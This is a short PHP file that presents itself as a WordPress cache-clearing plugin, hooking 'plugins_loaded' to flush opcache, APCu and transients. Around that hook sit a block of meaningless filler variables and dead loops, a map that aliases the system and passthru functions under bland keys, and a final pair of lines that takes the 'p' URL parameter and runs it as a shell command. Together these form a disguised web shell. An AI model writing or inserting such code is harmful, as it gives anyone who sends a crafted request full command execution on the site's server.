<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

add_action(
	'plugins_loaded',
	static function () {
		if ( isset( $_GET['clear_cache'] ) ) {
			if ( function_exists( 'opcache_reset' ) ) {
				opcache_reset();
			}

			if ( function_exists( 'apcu_clear_cache' ) ) {
				apcu_clear_cache();
			}

			wp_cache_flush();

			delete_expired_transients( true );

			clearstatcache( true );

			status_header( 202 );

			die;
		}
	},
	1
);

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>